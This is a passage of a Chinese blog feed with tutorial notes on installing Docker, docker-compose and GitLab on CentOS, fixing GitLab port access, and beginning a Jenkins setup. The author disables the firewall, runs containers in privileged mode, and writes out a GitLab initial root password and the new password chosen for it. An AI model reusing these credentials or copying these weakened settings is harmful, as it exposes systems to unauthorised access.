class="headerlink" title="换Docker源"></a>换Docker源</h3><p>换Docker源，以便能够下载并安装最新版本的Docker。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250213164922229.png" alt="image-20250213164922229"></p><h3 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h3><p>通过yum命令安装Docker。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250213165139361.png" alt="image-20250213165139361"></p><h3 id="启动Docker服务"><a href="#启动Docker服务" class="headerlink" title="启动Docker服务"></a>启动Docker服务</h3><p>安装完成后，需要启动Docker服务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure><h3 id="验证Docker是否安装成功"><a href="#验证Docker是否安装成功" class="headerlink" title="验证Docker是否安装成功"></a>验证Docker是否安装成功</h3><p>可以通过查看Docker版本的方式来验证Docker是否安装成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker --version</span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250213165234663.png" alt="image-20250213165234663"></p><h2 id="三、安装指定版本的Docker"><a href="#三、安装指定版本的Docker" class="headerlink" title="三、安装指定版本的Docker"></a>三、安装指定版本的Docker</h2><p>如果需要安装指定版本的Docker，可以先查看yum源支持的Docker版本，然后通过指定版本号的方式来安装。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum list docker-ce --showduplicates | sort -r</span><br></pre></td></tr></table></figure><p>例如，要安装19.03.9版本的Docker，可以执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install docker-ce-19.03.9 docker-ce-cli-19.03.9 containerd.io</span><br></pre></td></tr></table></figure><h2 id="四、安装Docker-Compose"><a href="#四、安装Docker-Compose" class="headerlink" title="四、安装Docker-Compose"></a>四、安装Docker-Compose</h2><p>Docker-Compose可以通过二进制安装的方式进行安装。首先需要下载对应版本的Docker-Compose二进制文件，并将其添加到系统路径中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 下载Docker-Compose二进制文件</span><br><span class="line">curl -L &quot;https://github.com/docker/compose/releases/download/v2.32.4/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</span><br><span class="line"># 添加执行权限</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br><span class="line"># 验证安装是否成功</span><br><span class="line">docker-compose --version</span><br><span class="line"></span><br><span class="line">建立软连接</span><br><span class="line">ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose</span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250213165647049.png" alt="image-20250213165647049"></p><p><img src="/images/centos-docker-gitlab.assets/image-20250213165726482.png" alt="image-20250213165726482"></p><p>至此，CentOS系统下的Docker与Docker-Compose安装完成。接下来，就可以使用Docker和Docker-Compose来管理和部署容器化应用了。</p><h1 id="安装gitlab"><a href="#安装gitlab" class="headerlink" title="安装gitlab"></a>安装gitlab</h1><h2 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl status firewalld</span><br><span class="line">systemctl stop firewalld</span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250213170511053.png" alt="image-20250213170511053"></p><p><img src="/images/centos-docker-gitlab.assets/image-20250213170526685.png" alt="image-20250213170526685"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@192 ~]# cd /usr/local</span><br><span class="line">[root@192 local]# mkdir docker</span><br><span class="line">[root@192 local]# cd  docker/</span><br><span class="line">[root@192 docker]# mkdir gitlab_docker</span><br><span class="line">[root@192 docker]# cd gitlab_docker/</span><br><span class="line">创建</span><br><span class="line">/usr/local/docker/gitlab_docker/docker-compose.yml</span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250213170823360.png" alt="image-20250213170823360"></p><h2 id="查询gitlab"><a href="#查询gitlab" class="headerlink" title="查询gitlab"></a>查询gitlab</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search gitlab</span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250213171159212.png" alt="image-20250213171159212"></p><h2 id="方法一：使用阿里云镜像加速（失败）-换以下镜像地址"><a href="#方法一：使用阿里云镜像加速（失败）-换以下镜像地址" class="headerlink" title="方法一：使用阿里云镜像加速（失败）,换以下镜像地址"></a>方法一：使用阿里云镜像加速（失败）,换以下镜像地址</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://docker.1ms.run&quot;,</span><br><span class="line">  &quot;https://hub.rat.dev&quot;,</span><br><span class="line">&quot;https://docker.1panel.live&quot;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull gitlab/gitlab-ce:latest</span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250213193455496.png" alt="image-20250213193455496"></p><h2 id="方法二：创建阿里云容器镜像服务-md"><a href="#方法二：创建阿里云容器镜像服务-md" class="headerlink" title="方法二：创建阿里云容器镜像服务.md"></a>方法二：创建阿里云容器镜像服务.md</h2><p>DockerToAliRepo</p><h2 id="失败，直接看下面“原因”目录"><a href="#失败，直接看下面“原因”目录" class="headerlink" title="失败，直接看下面“原因”目录"></a>失败，直接看下面“原因”目录</h2><h2 id="配置docker-compose-yml"><a href="#配置docker-compose-yml" class="headerlink" title="配置docker-compose.yml"></a>配置docker-compose.yml</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">不需要版本号</span><br><span class="line">services:</span><br><span class="line">  gitlab:</span><br><span class="line">    image: &#x27;gitlab/gitlab-ce:latest&#x27;</span><br><span class="line">    container_name: gitlab</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">        GITLAB_OMNIBUS_CONFIG: |</span><br><span class="line">        external_url &#x27;http://192.168.128.151: 8929&#x27;</span><br><span class="line">        gitlab_rails[&#x27;gitlab_shell_ssh_port&#x27;]: 2224</span><br><span class="line">    ports:</span><br><span class="line">      - &#x27;8929:8929&#x27;</span><br><span class="line">      - &#x27;2224:2224&#x27;</span><br><span class="line">    volumes:</span><br><span class="line">      - &#x27;./config:/etc/gitlab&#x27;</span><br><span class="line">      - &#x27;./logs:/var/log/gitlab&#x27;</span><br><span class="line">      - &#x27;./data:/var/opt/gitlab&#x27;</span><br></pre></td></tr></table></figure><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250213204133508.png" alt="image-20250213204133508"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看运行日志</span><br><span class="line">docker-compose logs -f</span><br></pre></td></tr></table></figure><h2 id="主机访问不到http-192-168-128-151-8929"><a href="#主机访问不到http-192-168-128-151-8929" class="headerlink" title="主机访问不到http://192.168.128.151:8929/"></a>主机访问不到<a href="http://192.168.128.151:8929/">http://192.168.128.151:8929/</a></h2><p><img src="/images/centos-docker-gitlab.assets/image-20250213224037112.png" alt="image-20250213224037112"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect  a2ff36851466 | grep Gateway</span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250213224141023.png" alt="image-20250213224141023"></p><h3 id="使用Docker的IP地址"><a href="#使用Docker的IP地址" class="headerlink" title="使用Docker的IP地址"></a>使用Docker的IP地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker inspect -f &#x27;&#123;&#123;range .NetworkSettings.Networks&#125;&#125;&#123;&#123;.IPAddress&#125;&#125;&#123;&#123;end&#125;&#125;&#x27; a2ff36851466</span><br><span class="line">curl http://172.18.0.2:8929</span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250213225135054.png" alt="image-20250213225135054"></p><p><img src="/images/centos-docker-gitlab.assets/image-20250213225843681.png" alt="image-20250213225843681"></p><h3 id="Docker的端口映射功能"><a href="#Docker的端口映射功能" class="headerlink" title="Docker的端口映射功能"></a>Docker的端口映射功能</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker port a2ff3685146</span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250213225707019.png" alt="image-20250213225707019"></p><h3 id="换镜像试一下命令行"><a href="#换镜像试一下命令行" class="headerlink" title="换镜像试一下命令行"></a>换镜像试一下命令行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8929:8929 -p 8022:8022 \</span><br><span class="line">--restart always --name gitlab \</span><br><span class="line">-v /usr/local/docker/gitlab_docker/config:/etc/gitlab \</span><br><span class="line">-v /usr/local/docker/gitlab_docker/logs:/var/log/gitlab \</span><br><span class="line">-v /usr/local/docker/gitlab_docker/data:/var/opt/gitlab \</span><br><span class="line">--privileged=true gitlab/gitlab-ce</span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250214121014256.png" alt="image-20250214121014256"></p><h3 id="修改容器配置"><a href="#修改容器配置" class="headerlink" title="修改容器配置"></a>修改容器配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it bdb560dbd2c2  /bin/bash</span><br><span class="line">vi /etc/gitlab/gitlab.rb</span><br><span class="line"></span><br><span class="line">可以直接复制</span><br><span class="line">external_url &#x27;http://192.168.128.151:8929&#x27;</span><br><span class="line">gitlab_rails[&#x27;gitlab_ssh_host&#x27;] = &#x27;192.168.128.151&#x27;</span><br><span class="line">gitlab_rails[&#x27;gitlab_shell_ssh_port&#x27;] = 2224  #这个在比较远下面705行</span><br><span class="line"></span><br><span class="line">在命令模式下（按Esc键进入），输入:set number或:set nu，然后按Enter键</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250214122834387.png" alt="image-20250214122834387"></p><h3 id="修改gitlab-yml"><a href="#修改gitlab-yml" class="headerlink" title="修改gitlab.yml"></a>修改gitlab.yml</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/gitlab/embedded/service/gitlab-rails/config/gitlab.yml</span><br><span class="line"></span><br><span class="line">host: 192.168.128.151</span><br><span class="line">port: 8929</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250214130933080.png" alt="image-20250214130933080"></p><h3 id="重新启动gitlab服务"><a href="#重新启动gitlab服务" class="headerlink" title="重新启动gitlab服务"></a>重新启动gitlab服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gitlab-ctl restart</span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250214123125211.png" alt="image-20250214123125211"></p><h2 id="原因，一种解决办法"><a href="#原因，一种解决办法" class="headerlink" title="原因，一种解决办法"></a>原因，一种解决办法</h2><h3 id="使用命令行加-h-192-168-128-151"><a href="#使用命令行加-h-192-168-128-151" class="headerlink" title="使用命令行加-h 192.168.128.151"></a>使用命令行加-h 192.168.128.151</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">-h 192.168.128.151 \</span><br><span class="line">-p 8089:8089 -p 8022:8022 \</span><br><span class="line">--restart always --name gitlab \</span><br><span class="line">-v /usr/local/docker/gitlab_docker/config:/etc/gitlab \</span><br><span class="line">-v /usr/local/docker/gitlab_docker/logs:/var/log/gitlab \</span><br><span class="line">-v /usr/local/docker/gitlab_docker/data:/var/opt/gitlab \</span><br><span class="line">--privileged=true gitlab/gitlab-ce</span><br></pre></td></tr></table></figure><p>映射端口-p 8089:8089 -p 8022:8022，需要修改vi &#x2F;etc&#x2F;gitlab&#x2F;gitlab.rb，vi &#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;config&#x2F;gitlab.yml，</p><p>（最好使用默认80&#x2F;22， -p 8089:80 -p 8022:22），加 -h 192.168.128.151，gitlab-ctl restart重启还不行，<strong>需要退出停止删除容器docker stop xxxxxxx，docker container prune，然后再次启动</strong>，docker logs -f f5042f1ecb3c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[2025-02-14T07:19:43+00:00] INFO: templatesymlink[Create a gitlab.yml and create a symlink to Rails root] sending run action to execute[clear the gitlab-rails cache] (delayed)</span><br><span class="line">Recipe: gitlab::gitlab-rails</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250214152355721.png" alt="image-20250214152355721"></p><p><img src="/images/centos-docker-gitlab.assets/image-20250214154920143.png" alt="image-20250214154920143"></p><h2 id="查看gitlab默认密码"><a href="#查看gitlab默认密码" class="headerlink" title="查看gitlab默认密码"></a>查看gitlab默认密码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 78020ec6add9 /bin/bash</span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250214155050120.png" alt="image-20250214155050120"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root用户</span><br><span class="line">vi /etc/gitlab/initial_root_password</span><br><span class="line"></span><br><span class="line">50Bxv8sksGasgYgtOO0WvV9/GD8XFA7Y37wWfdFIVkg=</span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250214155124935.png" alt="image-20250214155124935"></p><p><img src="/images/centos-docker-gitlab.assets/image-20250214155227730.png" alt="image-20250214155227730"></p><h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">50Bxv8sksGasgYgtOO0WvV9/GD8XFA7Y37wWfdFIVkg=</span><br><span class="line"></span><br><span class="line">MYgit@lab132</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250214160205635.png" alt="image-20250214160205635"></p><p><img src="/images/centos-docker-gitlab.assets/image-20250214160231589.png" alt="image-20250214160231589"></p><h1 id="解决：docker-重启-挂起后端口又访问不到"><a href="#解决：docker-重启-挂起后端口又访问不到" class="headerlink" title="解决：docker 重启&#x2F;挂起后端口又访问不到"></a>解决：docker 重启&#x2F;挂起后端口又访问不到</h1><h3 id="排查原因："><a href="#排查原因：" class="headerlink" title="排查原因："></a>排查原因：</h3><h4 id="路由排查"><a href="#路由排查" class="headerlink" title="路由排查"></a>路由排查</h4><p>虚拟机挂起后少了两条路由，重启docker会重新添加，有时没有少路由还是不行**，不是这个原因**</p><p><img src="/images/centos-docker-gitlab.assets/image-20250216151831276.png" alt="image-20250216151831276"></p><p><img src="/images/centos-docker-gitlab.assets/image-20250216152712573.png" alt="image-20250216152712573"></p><h4 id="查看docker-日志"><a href="#查看docker-日志" class="headerlink" title="查看docker 日志"></a>查看docker 日志</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tail -200f /var/log/messages</span><br><span class="line">sudo journalctl -u docker.service</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msg=&quot;Failed to clean iptables rules for bridge network: COMMAND_FAILED: &#x27;/usr/sbin/ip6tables-restore -w -n&#x27; failed: ip6tables-restore: line 2 failed\n&quot;</span><br></pre></td></tr></table></figure><h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><h4 id="方法一：清理docker0"><a href="#方法一：清理docker0" class="headerlink" title="方法一：清理docker0"></a>方法一：清理docker0</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_43769253/article/details/127731123</span><br><span class="line">安装brctl</span><br><span class="line">yum install bridge-utils</span><br><span class="line"></span><br><span class="line">systemctl stop docker </span><br><span class="line">pkill docker</span><br><span class="line">iptables -t nat -F</span><br><span class="line">ip <span class="built_in">link</span> <span class="built_in">set</span> docker0 down</span><br><span class="line">brctl delbr docker0</span><br><span class="line">systemctl start docker</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">systemctl stop docker <span class="comment"># 停止docker 服务</span></span><br><span class="line">pkill docker <span class="comment"># 杀掉docker进程</span></span><br><span class="line">iptables -t nat -F <span class="comment"># 清理iptables</span></span><br><span class="line">ip <span class="built_in">link</span> <span class="built_in">set</span> docker0 down <span class="comment"># 停止docker0网卡</span></span><br><span class="line">brctl delbr docker0 <span class="comment"># 删除docker0网卡--重点！</span></span><br><span class="line">systemctl start docker <span class="comment"># 启动docker服务</span></span><br><span class="line">docker start xxxxxxx</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="方法二：Docker-网络缓存问题"><a href="#方法二：Docker-网络缓存问题" class="headerlink" title="方法二：Docker 网络缓存问题"></a>方法二：Docker 网络缓存问题</h4><ul><li><strong>原因</strong>：Docker 的网络配置可能缓存了错误的状态，导致容器无法通过 <code>docker0</code> 桥接网络访问。</li><li><strong>清理 <code>docker0</code> 的作用</strong>：清理后，Docker 会重新初始化网络配置，清除缓存问题。</li><li><strong>解决方法</strong>：<br>清理 Docker 的网络缓存：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker network prune</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><p><img src="/images/centos-docker-gitlab.assets/image-20250216142635401.png" alt="image-20250216142635401"></p><h4 id="方法三：docker0-网络配置损坏"><a href="#方法三：docker0-网络配置损坏" class="headerlink" title="方法三：docker0 网络配置损坏"></a>方法三：docker0 网络配置损坏</h4><ul><li><p><strong>原因</strong>：<code>docker0</code> 的配置可能在重启或某些操作后损坏，导致容器无法通过桥接网络与主机通信。</p></li><li><p><strong>清理 <code>docker0</code> 的作用</strong>：清理后，Docker 会重新生成 <code>docker0</code> 接口并恢复默认配置，修复网络连接。</p></li><li><p><strong>解决方法</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><p>或者手动清理并重启 Docker：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip link delete docker0</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> DevOps环境搭建 </category>
          
          <category> gitlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CI/CD </tag>
            
            <tag> docker </tag>
            
            <tag> gitlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker jenkins</title>
      <link href="/2025/03/09/centos-docker-jenkins/"/>
      <url>/2025/03/09/centos-docker-jenkins/</url>
      
        <content type="html"><![CDATA[<h1 id="CI-CD（2）"><a href="#CI-CD（2）" class="headerlink" title="CI&#x2F;CD（2）"></a>CI&#x2F;CD（2）</h1><h2 id="一、克隆虚拟机"><a href="#一、克隆虚拟机" class="headerlink" title="一、克隆虚拟机"></a>一、克隆虚拟机</h2><h3 id="固定IP"><a href="#固定IP" class="headerlink" title="固定IP"></a>固定IP</h3><p>vi &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ens33</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BOOTPROTO=none</span><br><span class="line">IPADDR=192.168.128.152 </span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">GATEWAY=192.168.128.2</span><br><span class="line">DNS1=8.8.8.8</span><br><span class="line">DNS2=8.8.4.4</span><br><span class="line"></span><br><span class="line">systemctl restart network  </span><br></pre></td></tr></table></figure><h3 id="下载jdk和maven"><a href="#下载jdk和maven" class="headerlink" title="下载jdk和maven"></a>下载jdk和maven</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf apache-maven-3.9.9-bin.tar.gz -C /usr/local</span><br><span class="line">tar -zxvf jdk-21_linux-x64_bin.tar.gz -C /usr/local</span><br><span class="line"></span><br><span class="line">cd /usr/local</span><br><span class="line">mv jdk-21.0.6/ jdk/</span><br><span class="line">mv apache-maven-3.9.9/ maven/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/centos-jenkins.assets/image-20250214164057420.png" alt="image-20250214164057420"></p><h3 id="设置maven私服-jdk-三处"><a href="#设置maven私服-jdk-三处" class="headerlink" title="设置maven私服&#x2F;jdk,三处"></a>设置maven私服&#x2F;jdk,三处</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">cd maven/conf/</span><br><span class="line">vi settings.xml</span><br><span class="line"></span><br><span class="line">&lt;mirror&gt;</span><br><span class="line">&lt;id&gt;alimaven&lt;/id&gt;</span><br><span class="line">&lt;name&gt;public&lt;/name&gt;</span><br><span class="line">&lt;url&gt;https://maven.aliyun.com/repository/public/&lt;/url&gt;</span><br><span class="line">&lt;mirrorOf&gt;public&lt;/mirrorOf&gt;</span><br><span class="line">&lt;/mirror&gt;</span><br><span class="line"></span><br><span class="line">    &lt;profiles&gt;</span><br><span class="line">        &lt;profile&gt;</span><br><span class="line">            &lt;id&gt;jdk-21&lt;/id&gt;</span><br><span class="line">            &lt;activation&gt;</span><br><span class="line">                &lt;activeByDefault&gt;true&lt;/activeByDefault&gt;</span><br><span class="line">            &lt;/activation&gt;</span><br><span class="line">            &lt;properties&gt;</span><br><span class="line">                &lt;maven.compiler.source&gt;21&lt;/maven.compiler.source&gt;</span><br><span class="line">                &lt;maven.compiler.target&gt;21&lt;/maven.compiler.target&gt;</span><br><span class="line">            &lt;/properties&gt;</span><br><span class="line">        &lt;/profile&gt;</span><br><span class="line">    &lt;/profiles&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> &lt;activeProfiles&gt;</span><br><span class="line">     &lt;activeProfile&gt;jdk-21&lt;/activeProfile&gt;</span><br><span class="line"> &lt;/activeProfiles&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/centos-jenkins.assets/image-20250214164938643.png" alt="image-20250214164938643"></p><p><img src="/images/centos-jenkins.assets/image-20250214165838686.png" alt="image-20250214165838686"></p><p><img src="/images/centos-jenkins.assets/image-20250214170116534.png" alt="image-20250214170116534"></p><h2 id="二、安装Docker"><a href="#二、安装Docker" class="headerlink" title="二、安装Docker"></a>二、安装Docker</h2><h3 id="参考centos-docker-gitlab-md"><a href="#参考centos-docker-gitlab-md" class="headerlink" title="参考centos-docker-gitlab.md"></a>参考centos-docker-gitlab.md</h3><p>docker-compose可直接移动到</p><p>mv docker-compose &#x2F;usr&#x2F;bin&#x2F;docker-compose</p><h2 id="三、安装Jenkins"><a href="#三、安装Jenkins" class="headerlink" title="三、安装Jenkins"></a>三、安装Jenkins</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.jenkins.io/download/</span><br><span class="line">docker pull jenkins/jenkins:2.492.1-lts</span><br></pre></td></tr></table></figure><p><img src="D:\MY-tool\云安全\搭建DevOps教程\centos-docker-jenkins.assets\image-20250214175051050.png" alt="image-20250214175051050"></p><h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker login --username=r_r_r_r crpi-oep0r0ys6k2kecir.cn-guangzhou.personal.cr.aliyuncs.com</span><br><span class="line"></span><br><span class="line">docker pull 